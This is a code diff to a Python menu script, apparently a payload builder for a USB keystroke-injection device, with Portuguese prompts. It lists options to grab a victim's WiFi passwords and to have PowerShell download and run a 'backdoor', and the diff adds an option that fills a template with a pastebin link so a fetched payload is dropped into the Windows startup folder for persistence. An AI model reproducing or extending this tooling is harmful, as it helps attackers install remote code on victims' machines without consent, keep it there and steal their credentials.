@@ -12,6 +12,7 @@ def subpowershellmenu():
     2 - Grabb Wifi's passwords from user
     3 - Powershell Download and execute
     4 - Wifi FAST Association and Connect
+    5 - Powershell download and send to startup folder
     0 - Back to frist select menu
     """)
 
@@ -55,7 +56,7 @@ def subpowershellmenu():
 
         link = raw_input(str("Digite o link do backdoor : "))
         backdoor = raw_input(str("Digite o nome do arquivo : "))
-        
+
 
         f = open('payloads/Psdownandexecute.ino', 'r')
         filedata = f.read()
@@ -65,8 +66,8 @@ def subpowershellmenu():
         f.write(newdata)
         f.close()
         os.system("start out/OUT-Psdownandexecute.ino")
-		
-		
+
+
     elif submenuselect == "4":
         link = raw_input(str("Digite o link pastebin : "))
 	essid = raw_input(str("Digite o nome da rede : "))
@@ -78,7 +79,21 @@ def subpowershellmenu():
 	f.write(newdata)
 	f.close()
 	os.system("start out/OUT-wifiassociationFast.ino")
-	
+
+
+    elif submenuselect == "5":
+        paste = raw_input(str("Digite o link pastebin : "))
+	payname = raw_input(str("Digite o nome do payload : "))
+	f = open('payloads/Psdownforstartup.ino', 'r')
+	filedata = f.read()
+	f.close()
+	newdata = filedata.replace("HOST", paste).replace("PAYLOAD", payname)
+	f = open('out/OUT-Psdownforstartup.ino', 'w')
+	f.write(newdata)
+	f.close()
+	os.system("start out/OUT-Psdownforstartup.ino")
+
+
     elif submenuselect == "0":
         os.system('cls')
         logo1()
